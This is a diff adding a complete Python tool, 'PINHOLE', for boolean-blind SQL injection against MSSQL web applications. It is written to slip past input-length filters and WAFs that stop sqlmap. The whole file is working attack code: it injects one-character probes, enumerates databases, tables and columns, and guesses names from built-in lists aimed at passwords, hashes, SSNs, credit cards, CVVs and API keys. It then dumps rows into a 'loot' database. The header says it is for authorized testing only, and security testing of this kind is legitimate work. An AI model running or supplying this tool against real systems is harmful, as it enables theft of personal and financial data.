@@ -1,0 +1,679 @@
+#!/usr/bin/env python3
+"""
+PINHOLE - minimal boolean-blind SQL injection extractor for MSSQL targets
+behind an aggressive input-length filter that breaks sqlmap.
+
+Why it exists:
+  Some targets cap the length of an injectable parameter (app-level field
+  validation, a Suhosin-style limit, a WAF). sqlmap's extraction payloads
+  wrap every read in UNICODE(SUBSTRING((SELECT ...))) and a numeric
+  bisection, which can run too long and 500 against such a cap. PINHOLE
+  reads one bit per request with the shortest possible payload
+  ( SUBSTRING(x,n,1)='c' ), so it slips under length filters that choke
+  sqlmap.
+
+Features:
+  - minimal per-bit payloads (equality form, not UNICODE bisection)
+  - per-character VERIFICATION: each matched char is re-confirmed and an
+    unmatched position retried, to defeat flaky/noisy oracles
+  - optional backend-affinity pinning (ARRAffinity) to stabilise the oracle
+    on load-balanced targets
+  - LIVE display with sqlmap-style output and result tables
+  - CAP AWARENESS: --calibrate measures the payload budget; over-budget
+    probes are reported as "unreachable" instead of returning junk
+  - wordlist guessing for databases / tables / columns when catalog
+    enumeration is blocked (non-DBA logins)
+  - stores everything to SQLite
+
+Mark the injection point in the raw request file with a single '*'.
+
+For authorized security testing only. You are responsible for staying
+within the scope of your engagement and the law.
+"""
+
+import argparse
+import re
+import sqlite3
+import sys
+import time
+import urllib.parse
+from http.cookies import SimpleCookie
+
+try:
+    import requests
+    import urllib3
+    urllib3.disable_warnings()
+except ImportError:
+    sys.exit("pip install requests")
+
+MARKER = "*"
+VERSION = "3.0"
+
+BANNER = r"""
+    ██████╗ ██╗███╗   ██╗██╗  ██╗ ██████╗ ██╗     ███████╗
+    ██╔══██╗██║████╗  ██║██║  ██║██╔═══██╗██║     ██╔════╝
+    ██████╔╝██║██╔██╗ ██║███████║██║   ██║██║     █████╗
+    ██╔═══╝ ██║██║╚██╗██║██╔══██║██║   ██║██║     ██╔══╝
+    ██║     ██║██║ ╚████║██║  ██║╚██████╔╝███████╗███████╗
+    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
+         ·  ( o )  ─────────────────────────────
+         boolean-blind SQLi through a tiny hole      v%s
+         minimal payloads · beats length filters that choke sqlmap
+""" % VERSION
+
+# ---- tiny ANSI helpers for sqlmap-ish output -----------------------------
+def c(txt, code):
+    return f"\033[{code}m{txt}\033[0m"
+
+def print_banner():
+    print(c(BANNER, "36"))
+def info(m):  print(f"[{c('*','36')}] {m}")
+def good(m):  print(f"[{c('+','32')}] {m}")
+def warn(m):  print(f"[{c('!','33')}] {m}")
+def err(m):   print(f"[{c('x','31')}] {m}")
+
+
+class RawRequest:
+    def __init__(self, path, force_ssl=False):
+        with open(path, "r", errors="replace") as f:
+            raw = f.read()
+        if MARKER not in raw:
+            sys.exit(f"No injection marker '{MARKER}' found in request file.")
+        parts = re.split(r"\r?\n\r?\n", raw, maxsplit=1)
+        head = parts[0]
+        self.body = parts[1] if len(parts) > 1 else ""
+        lines = head.splitlines()
+        self.method, self.uri, _ = (lines[0].split() + ["", "", ""])[:3]
+        self.headers = {}
+        for line in lines[1:]:
+            if ":" in line:
+                k, v = line.split(":", 1)
+                self.headers[k.strip()] = v.strip()
+        host = self.headers.get("Host", "")
+        scheme = "https" if force_ssl or self.uri.startswith("https") else "http"
+        path = self.uri
+        if path.startswith("http"):
+            path = urllib.parse.urlsplit(path).path or "/"
+        self.base_url = f"{scheme}://{host}{path.split('?')[0]}"
+        self.query = path.split("?", 1)[1] if "?" in path else ""
+        self.marker_in_query = MARKER in self.query
+        self.marker_in_body = MARKER in self.body
+        if not (self.marker_in_query or self.marker_in_body):
+            sys.exit("Marker must be in the query string or body.")
+
+    def cookie_header(self):
+        for k in self.headers:
+            if k.lower() == "cookie":
+                return k, self.headers[k]
+        return "Cookie", ""
+
+
+class Injector:
+    def __init__(self, req, args):
+        self.req = req
+        self.args = args
+        self.prefix = args.prefix
+        self.suffix = args.suffix
+        self.votes = args.votes
+        self.session = requests.Session()
+        self.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
+        self.pinned_cookie = None
+        self.request_count = 0
+        self.max_payload = args.max_payload
+        self.oversized = 0
+        self._ck_key, self._ck_val = req.cookie_header()
+        if args.pin_affinity:
+            self._establish_affinity()
+
+    # ---- request plumbing --------------------------------------------
+    def _inject(self, condition):
+        payload = f"{self.prefix}{condition}{self.suffix}"
+        enc = urllib.parse.quote(payload, safe="")
+        query = self.req.query.replace(MARKER, enc) if self.req.marker_in_query else self.req.query
+        body = self.req.body.replace(MARKER, enc) if self.req.marker_in_body else self.req.body
+        url = self.req.base_url + ("?" + query if query else "")
+        return url, body
+
+    def _headers(self):
+        h = dict(self.req.headers)
+        for bad in ("Host", "Content-Length", "content-length"):
+            h.pop(bad, None)
+        h["Host"] = self.req.headers.get("Host", "")
+        if self.pinned_cookie:
+            h[self._ck_key] = self.pinned_cookie
+        return h
+
+    def _raw_send(self, condition):
+        url, body = self._inject(condition)
+        self.request_count += 1
+        return self.session.request(
+            self.req.method if self.req.method in ("GET", "POST", "PUT") else "GET",
+            url, headers=self._headers(),
+            data=body.encode() if body else None,
+            proxies=self.proxies, verify=False,
+            allow_redirects=False, timeout=self.args.timeout)
+
+    def _establish_affinity(self):
+        try:
+            r = self._raw_send("1=1")
+        except Exception as e:
+            warn(f"baseline request failed: {e}")
+            return
+        jar = SimpleCookie()
+        if hasattr(r.raw, "headers"):
+            for sc in r.raw.headers.get_all("Set-Cookie", []) or []:
+                jar.load(sc)
+        existing = SimpleCookie()
+        existing.load(self._ck_val)
+        pinned = False
+        for name in ("ARRAffinity", "ARRAffinitySameSite"):
+            if name in jar:
+                existing[name] = jar[name].value
+                pinned = True
+        self.pinned_cookie = "; ".join(f"{k}={m.value}" for k, m in existing.items())
+        if pinned:
+            info(f"pinned backend affinity")
+
+    # ---- oracle ------------------------------------------------------
+    def _read(self, resp):
+        if resp.status_code == 500:
+            return None
+        if self.args.true_string:
+            return self.args.true_string in resp.text
+        if self.args.false_string:
+            return self.args.false_string not in resp.text
+        return resp.status_code == 200 and resp.text.strip() != self.args.false_default
+
+    def _over_budget(self, condition):
+        if not self.max_payload:
+            return False
+        return len(f"{self.prefix}{condition}{self.suffix}") > self.max_payload
+
+    def truth(self, condition):
+        """Vote a boolean, retrying past 500s. Returns True/False.
+        Over-budget probes short-circuit to False (and are counted)."""
+        if self._over_budget(condition):
+            self.oversized += 1
+            return False
+        got, attempts, cap = [], 0, self.votes * 5
+        while len(got) < self.votes and attempts < cap:
+            attempts += 1
+            try:
+                r = self._raw_send(condition)
+            except Exception:
+                time.sleep(0.3); continue
+            v = self._read(r)
+            if v is None:
+                continue
+            got.append(v)
+            if self.args.delay:
+                time.sleep(self.args.delay)
+        if not got:
+            return False
+        return sum(got) > len(got) / 2
+
+    # ---- calibration -------------------------------------------------
+    def calibrate(self):
+        if not self.truth("1=1"):
+            warn("calibration skipped: base condition not TRUE"); return
+        lo, hi = 0, 400
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            cond = "1=1" + (" AND 1=1" * mid)
+            if len(f"{self.prefix}{cond}{self.suffix}") > 3000:
+                hi = mid - 1; continue
+            saved = self.max_payload; self.max_payload = 0
+            ok = self.truth(cond)
+            self.max_payload = saved
+            if ok: lo = mid
+            else:  hi = mid - 1
+        cond = "1=1" + (" AND 1=1" * lo)
+        self.max_payload = len(f"{self.prefix}{cond}{self.suffix}")
+        info(f"measured payload budget: ~{self.max_payload} chars")
+
+    # ---- primitives --------------------------------------------------
+    def get_int(self, expr, maxv=10_000_000):
+        lo, hi = 0, 1
+        while self.truth(f"({expr})>{hi}"):
+            lo = hi; hi *= 2
+            if hi > maxv: hi = maxv; break
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self.truth(f"({expr})>{mid}"): lo = mid + 1
+            else: hi = mid
+        return lo
+
+    def get_len(self, expr, maxlen=256):
+        # probe budget: if even LEN(expr)>0 is over-cap, the value is
+        # unreachable — signal with -1 so the caller reports it honestly.
+        if self._over_budget(f"LEN({expr})>0"):
+            return -1
+        lo, hi = 0, 4
+        while self.truth(f"LEN({expr})>{hi}"):
+            lo = hi; hi *= 2
+            if hi > maxlen: hi = maxlen; break
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self.truth(f"LEN({expr})>{mid}"): lo = mid + 1
+            else: hi = mid
+        return lo
+
+    def _char_at(self, expr, pos):
+        """Return the char at pos using literal equality (shortest form),
+        VERIFIED: a positive match is re-confirmed; if nothing matches the
+        position is retried once before giving up."""
+        for attempt in range(2):
+            for ch in self.args.charset:
+                q = ch.replace("'", "''")
+                cond = f"SUBSTRING({expr},{pos},1)='{q}'"
+                if self._over_budget(cond):
+                    return None            # unreachable under cap
+                if self.truth(cond):
+                    # verify the hit (kills noisy false-positives)
+                    if self.truth(cond):
+                        return ch
+            # nothing matched this pass -> retry once (kills false-negatives)
+        return "?"                          # genuinely unresolved
+
+    def get_string(self, expr, label="", live=True):
+        n = self.get_len(expr)
+        if n == -1:
+            if live: warn(f"{label}: over cap — unreachable through this parameter")
+            return None
+        if n == 0:
+            return ""
+        out = []
+        for i in range(1, n + 1):
+            ch = self._char_at(expr, i)
+            if ch is None:
+                if live:
+                    print()
+                    warn(f"{label}: char {i} over cap — value unreachable "
+                         f"(need shorter payload / different parameter)")
+                return None
+            out.append(ch)
+            if live:
+                sys.stdout.write(f"\r[{c('~','36')}] {label}: {''.join(out)}")
+                sys.stdout.flush()
+        if live:
+            print()
+        return "".join(out)
+
+
+class Store:
+    def __init__(self, path):
+        self.db = sqlite3.connect(path)
+        self.db.executescript("""
+            CREATE TABLE IF NOT EXISTS info(k TEXT PRIMARY KEY, v TEXT);
+            CREATE TABLE IF NOT EXISTS databases(name TEXT PRIMARY KEY);
+            CREATE TABLE IF NOT EXISTS tables(db TEXT, name TEXT, PRIMARY KEY(db,name));
+            CREATE TABLE IF NOT EXISTS columns(db TEXT, tbl TEXT, name TEXT, PRIMARY KEY(db,tbl,name));
+            CREATE TABLE IF NOT EXISTS data(db TEXT, tbl TEXT, rownum INT, col TEXT, value TEXT);
+        """)
+        self.db.commit()
+    def info(self, k, v):
+        self.db.execute("INSERT OR REPLACE INTO info VALUES(?,?)", (k, v)); self.db.commit()
+    def add(self, table, row):
+        ph = ",".join("?" * len(row))
+        self.db.execute(f"INSERT OR IGNORE INTO {table} VALUES({ph})", row); self.db.commit()
+
+
+# ---- pretty result table (sqlmap-ish) ------------------------------------
+def render_table(title, headers, rows):
+    if not rows:
+        return
+    widths = [len(h) for h in headers]
+    for r in rows:
+        for i, cell in enumerate(r):
+            widths[i] = max(widths[i], len(str(cell)))
+    line = "+".join("-" * (w + 2) for w in widths)
+    print(f"\n{c(title,'1')}")
+    print(f"+{line}+")
+    print("| " + " | ".join(h.ljust(widths[i]) for i, h in enumerate(headers)) + " |")
+    print(f"+{line}+")
+    for r in rows:
+        print("| " + " | ".join(str(cell).ljust(widths[i]) for i, cell in enumerate(r)) + " |")
+    print(f"+{line}+")
+
+
+# ---- MSSQL query builders (catalog views need privileges) ----------------
+def q_db_count():          return "SELECT COUNT(*) FROM sys.databases"
+def q_db_name(i):          return f"SELECT name FROM sys.databases ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
+def q_tbl_count(db):       return f"SELECT COUNT(*) FROM {db}.sys.tables"
+def q_tbl_name(db, i):     return f"SELECT name FROM {db}.sys.tables ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
+def q_col_count(db, t):    return f"SELECT COUNT(*) FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{t}')"
+def q_col_name(db, t, i):  return f"SELECT name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{t}') ORDER BY column_id OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
+def q_row_count(tbl):      return f"SELECT COUNT(*) FROM {tbl}"
+def q_cell(tbl, col, i):   return f"SELECT MIN({col}) FROM (SELECT TOP {i+1} {col} FROM {tbl} ORDER BY {col}) t"
+
+
+def enum_databases(inj, store):
+    info("fetching databases")
+    n = inj.get_int(q_db_count(), maxv=10000)
+    if n == 0:
+        warn("0 databases (catalog view likely permission-denied to this login "
+             "— non-DBA accounts often can't read sys.databases)")
+        return []
+    names = []
+    for i in range(n):
+        name = inj.get_string(f"({q_db_name(i)})", label=f"database[{i}]")
+        if name:
+            good(f"database: {name}"); store.add("databases", (name,)); names.append(name)
+    return names
+
+
+# common names to try when catalog enumeration is blocked / no wordlist given
+# Generic top-50 name lists for guessing when catalog enumeration is blocked.
+# Kept short so payloads fit tight length caps. Supply your own with a
+# wordlist file for anything more specific.
+BUILTIN_DBS = [
+    "master", "tempdb", "model", "msdb",                      # system DBs
+    "ReportServer", "ReportServerTempDB", "distribution",
+    "Production", "Prod", "Dev", "Development", "Test", "Testing",
+    "Staging", "Stage", "Sandbox", "QA", "UAT", "Demo", "Backup",
+    "App", "AppDB", "Application", "Web", "WebDB", "Site", "Portal",
+    "Main", "MainDB", "Primary", "Data", "Database", "Core", "Default",
+    "Users", "Accounts", "Membership", "Identity", "Auth", "Security",
+    "CRM", "ERP", "Sales", "Billing", "Finance", "Inventory", "Store",
+    "Company", "Customer",
+]
+BUILTIN_TABLES = [
+    "Users", "User", "Accounts", "Account", "Members", "Member", "Membership",
+    "aspnet_Users", "aspnet_Membership", "Login", "Logins", "Credentials",
+    "Customers", "Customer", "Admin", "Admins", "Administrators", "Person",
+    "People", "Orders", "Order", "Payments", "Payment", "Transactions",
+    "Invoices", "Cards", "Roles", "Role", "Permissions", "Groups", "Group",
+    "Sessions", "Tokens", "ApiKeys", "Settings", "Config", "Configuration",
+    "AuditLog", "Audit", "Logs", "Log", "Staff", "Employees", "Employee",
+    "Contacts", "Contact", "Emails", "Messages", "Profiles", "Profile",
+    "Products", "Product", "Items", "Categories", "Notes", "Files",
+]
+BUILTIN_COLUMNS = [
+    "id", "username", "user", "email", "password", "passwd", "pwd",
+    "PasswordHash", "password_hash", "passwordhash", "Hash", "salt",
+    "PasswordSalt", "Password", "Email", "Username", "UserName", "Name",
+    "FirstName", "LastName", "FullName", "Phone", "Mobile", "Address",
+    "SSN", "DOB", "BirthDate", "CreditCard", "CardNumber", "CVV",
+    "token", "AccessToken", "ApiKey", "api_key", "secret", "PrivateKey",
+    "IsAdmin", "IsActive", "Role", "Status", "CreatedDate", "CreatedAt",
+    "UpdatedAt", "LastLogin", "IP", "SessionId",
+]
+
+
+def _read_wordlist(path, fallback):
+    if not path:
+        return list(fallback)
+    try:
+        with open(path) as f:
+            return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
+    except OSError as e:
+        err(f"cannot read wordlist {path}: {e}")
+        return []
+
+
+def guess_dbs(inj, store, path):
+    names = _read_wordlist(path, BUILTIN_DBS)
+    info(f"testing {len(names)} candidate database names "
+         f"({'wordlist '+path if path else 'built-in list'})")
+    found = []
+    for name in names:
+        cond = f"DB_ID('{name}')>0"     # exists -> id>0 -> TRUE; missing -> NULL -> FALSE
+        if inj._over_budget(cond):
+            warn(f"skip {name}: payload over cap")
+            continue
+        if inj.truth(cond):
+            good(f"database EXISTS: {name}")
+            store.add("databases", (name,)); found.append(name)
+        else:
+            print(f"    {c('-','90')} {name}")
+    render_table("databases found", ["database"], [[d] for d in found])
+    return found
+
+
+def guess_tables(inj, store, db, path):
+    names = _read_wordlist(path, BUILTIN_TABLES)
+    info(f"testing {len(names)} candidate table names "
+         f"({'wordlist '+path if path else 'built-in list'})")
+    found = []
+    for name in names:
+        cond = f"(SELECT COUNT(*) FROM {name})>=0"     # true if table exists+readable, 500 if not
+        if inj._over_budget(cond):
+            warn(f"skip {name}: payload over cap ({len(inj.prefix)+len(cond)+len(inj.suffix)}c)")
+            continue
+        if inj.truth(cond):
+            good(f"table EXISTS: {name}")
+            store.add("tables", (db, name)); found.append(name)
+        else:
+            print(f"    {c('-','90')} {name}")
+    render_table("tables found", ["table"], [[t] for t in found])
+    return found
+
+
+def guess_columns(inj, store, db, table, path):
+    names = _read_wordlist(path, BUILTIN_COLUMNS)
+    info(f"testing {len(names)} candidate columns in {table} "
+         f"({'wordlist '+path if path else 'built-in list'})")
+    found = []
+    for name in names:
+        cond = f"(SELECT COUNT({name}) FROM {table})>=0"  # valid col -> true, unknown col -> 500
+        if inj._over_budget(cond):
+            warn(f"skip {name}: payload over cap")
+            continue
+        if inj.truth(cond):
+            good(f"column EXISTS: {table}.{name}")
+            store.add("columns", (db, table, name)); found.append(name)
+        else:
+            print(f"    {c('-','90')} {name}")
+    render_table(f"columns found in {table}", ["column"], [[c] for c in found])
+    return found
+
+
+def enum_tables(inj, store, db):
+    info(f"fetching tables for {db}")
+    n = inj.get_int(q_tbl_count(db), maxv=100000)
+    if n == 0:
+        warn(f"0 tables for {db} (sys.tables likely permission-denied)")
+        return []
+    names = []
+    for i in range(n):
+        name = inj.get_string(f"({q_tbl_name(db, i)})", label=f"{db}.table[{i}]")
+        if name:
+            good(f"table: {db}.{name}"); store.add("tables", (db, name)); names.append(name)
+    return names
+
+
+def enum_columns(inj, store, db, tbl):
+    info(f"fetching columns for {tbl}")
+    n = inj.get_int(q_col_count(db, tbl), maxv=10000)
+    if n == 0:
+        warn(f"0 columns for {tbl} (sys.columns likely permission-denied)")
+        return []
+    cols = []
+    for i in range(n):
+        name = inj.get_string(f"({q_col_name(db, tbl, i)})", label=f"{tbl}.col[{i}]")
+        if name:
+            good(f"column: {tbl}.{name}"); store.add("columns", (db, tbl, name)); cols.append(name)
+    return cols
+
+
+def dump_table(inj, store, db, tbl, cols, max_rows):
+    rows_total = inj.get_int(q_row_count(tbl), maxv=10_000_000)
+    info(f"{tbl}: {rows_total} rows, columns {cols}")
+    limit = rows_total if max_rows <= 0 else min(rows_total, max_rows)
+    if limit < rows_total:
+        info(f"limiting to first {limit} rows (--max-rows)")
+    # quick reachability probe on the first cell so we fail loud, not silent
+    probe = inj.get_string(f"({q_cell(tbl, cols[0], 0)})", label=f"probe {cols[0]}")
+    if probe is None:
+        err(f"{tbl}.{cols[0]} is unreachable under the ~{inj.max_payload or '??'}-char "
+            f"cap (table+column payload exceeds the limit). This table cannot be "
+            f"dumped through this injection point. Try a parameter with a larger cap.")
+        return
+    collected = []
+    for r in range(limit):
+        row = []
+        for col in cols:
+            val = inj.get_string(f"({q_cell(tbl, col, r)})", label=f"{tbl}[{r}].{col}")
+            store.add("data", (db, tbl, r, col, val if val is not None else ""))
+            row.append(val if val is not None else "<over-cap>")
+        collected.append([r] + row)
+        good(f"row {r}: {row}")
+    render_table(f"{db}.{tbl} ({len(collected)} rows)", ["#"] + cols, collected)
+
+
+def main():
+    epilog = """\
+examples:
+  # scalars (DB name, login, version, privileges)
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --current-db --current-user --banner --is-dba
+
+  # measure the target's payload-length budget first
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --calibrate --current-db
+
+  # guess databases / tables / columns when the catalog is blocked (non-DBA)
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-dbs
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-tables
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --guess-columns -T Users
+
+  # dump named columns (fits only if the cap is large enough)
+  pinhole -r req.txt --force-ssl --true-string "TOKEN" --dump -T Users -C username,password --max-rows 10
+
+notes:
+  * mark the injection point with a single '*' in the request file
+  * set --prefix / --suffix to shape the breakout for your target
+    e.g. a value 'foo' in a LIKE clause:  --prefix "foo' AND " --suffix "-- -"
+  * pinhole reads one bit per request with the shortest possible payload
+    ( SUBSTRING(x,n,1)='c' ), so it slips under length filters that make
+    sqlmap's UNICODE(SUBSTRING((SELECT ...))) payloads 500.
+  * --true-string is a string present only in TRUE (row-returning) responses
+  * optional: it pins ARRAffinity and votes each bit to stabilise noisy oracles
+"""
+    p = argparse.ArgumentParser(
+        prog="pinhole",
+        description="PINHOLE — boolean-blind SQLi extractor that beats input-length "
+                    "filters by using minimal per-bit payloads. For authorized testing only.",
+        epilog=epilog,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    p.add_argument("-r", "--request", required=True)
+    p.add_argument("--force-ssl", action="store_true")
+    p.add_argument("--proxy")
+    p.add_argument("--timeout", type=float, default=20)
+    p.add_argument("--delay", type=float, default=0.0)
+    p.add_argument("--votes", type=int, default=3, help="reads per bit; majority wins")
+    p.add_argument("--no-pin", dest="pin_affinity", action="store_false")
+    p.add_argument("--prefix", default="' AND ",
+                   help="text placed before the injected condition (breakout). "
+                        "Default assumes the marker follows a string value, e.g. "
+                        "param=value* with --prefix \"' AND \".")
+    p.add_argument("--suffix", default="-- -",
+                   help="comment terminator placed after the condition")
+    p.add_argument("--true-string")
+    p.add_argument("--false-string")
+    p.add_argument("--false-default", default="[]")
+    p.add_argument("--charset",
+                   default="abcdefghijklmnopqrstuvwxyz0123456789_-. @ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+    p.add_argument("--max-payload", type=int, default=0,
+                   help="payload length cap in chars (0=off). Over-cap probes are "
+                        "reported as unreachable instead of returning junk.")
+    p.add_argument("--calibrate", action="store_true",
+                   help="measure the target's payload budget at startup")
+    p.add_argument("--current-user", action="store_true")
+    p.add_argument("--current-db", action="store_true")
+    p.add_argument("--banner", action="store_true")
+    p.add_argument("--is-dba", action="store_true")
+    p.add_argument("--dbs", action="store_true")
+    p.add_argument("--tables", action="store_true")
+    p.add_argument("--columns", action="store_true")
+    p.add_argument("--dump", action="store_true")
+    p.add_argument("--guess-dbs", nargs="?", const="", metavar="WORDLIST",
+                   help="test candidate database names via DB_ID() (no catalog needed). "
+                        "Give a wordlist file, or omit for the built-in list.")
+    p.add_argument("--guess-tables", nargs="?", const="", metavar="WORDLIST",
+                   help="test candidate table names (direct FROM, no catalog needed). "
+                        "Give a wordlist file, or omit for the built-in list.")
+    p.add_argument("--guess-columns", nargs="?", const="", metavar="WORDLIST",
+                   help="test candidate columns in -T TABLE. "
+                        "Give a wordlist file, or omit for the built-in list.")
+    p.add_argument("-D", "--database")
+    p.add_argument("-T", "--table")
+    p.add_argument("-C", "--columns-list")
+    p.add_argument("--max-rows", type=int, default=0, help="cap rows on --dump (0=all)")
+    p.add_argument("-o", "--output", default="loot.db")
+    p.add_argument("--version", action="version", version=f"PINHOLE {VERSION}")
+    args = p.parse_args()
+
+    print_banner()
+    req = RawRequest(args.request, args.force_ssl)
+    inj = Injector(req, args)
+    store = Store(args.output)
+
+    t = inj.truth("1=1"); f = inj.truth("1=2")
+    info(f"oracle check: 1=1 -> {t}, 1=2 -> {f}")
+    if not (t and not f):
+        err("oracle unreliable. Set --true-string to a token only in TRUE responses.")
+        return
+    if args.calibrate:
+        inj.calibrate()
+    info(f"saving to {args.output}")
+
+    results = []
+    if args.banner:
+        v = inj.get_string("(@@version)", label="banner")
+        if v: good(f"banner: {v}"); store.info("banner", v); results.append(("banner", v))
+    if args.current_user:
+        v = inj.get_string("(SYSTEM_USER)", label="current user")
+        if v: good(f"current user: {v}"); store.info("current_user", v); results.append(("current_user", v))
+    if args.current_db:
+        v = inj.get_string("(DB_NAME())", label="current db")
+        if v: good(f"current db: {v}"); store.info("current_db", v); results.append(("current_db", v))
+    if args.is_dba:
+        dba = inj.truth("IS_SRVROLEMEMBER('sysadmin')=1")
+        good(f"is DBA: {dba}"); store.info("is_dba", str(dba)); results.append(("is_dba", str(dba)))
+    if results:
+        render_table("server info", ["key", "value"], results)
+
+    dbs = []
+    if args.dbs or (args.tables and not args.database):
+        dbs = enum_databases(inj, store)
+
+    targets = []
+    if args.database:
+        targets = [d.strip() for d in args.database.split(",")]
+    elif dbs:
+        targets = dbs
+
+    if args.guess_dbs is not None:
+        guess_dbs(inj, store, args.guess_dbs or None)
+    if args.guess_tables is not None:
+        guess_tables(inj, store, (targets[0] if targets else None),
+                     args.guess_tables or None)
+    if args.guess_columns is not None:
+        if not args.table:
+            err("--guess-columns needs -T TABLE")
+        else:
+            guess_columns(inj, store, (targets[0] if targets else None),
+                          args.table, args.guess_columns or None)
+
+    if args.tables:
+        for d in targets:
+            enum_tables(inj, store, d)
+    if args.columns and args.table:
+        for d in (targets or [None]):
+            enum_columns(inj, store, d, args.table)
+    if args.dump and args.table:
+        cols = [x.strip() for x in args.columns_list.split(",")] if args.columns_list else []
+        if not cols:
+            for d in (targets or [None]):
+                cols = enum_columns(inj, store, d, args.table)
+        for d in (targets or [None]):
+            if cols:
+                dump_table(inj, store, d, args.table, cols, args.max_rows)
+            else:
+                err("no columns to dump (enumeration blocked; pass -C col1,col2)")
+
+    info(f"done. {inj.request_count} requests. "
+         f"{inj.oversized} probes skipped as over-cap. loot in {args.output}")
+
+
+if __name__ == "__main__":
+    main()
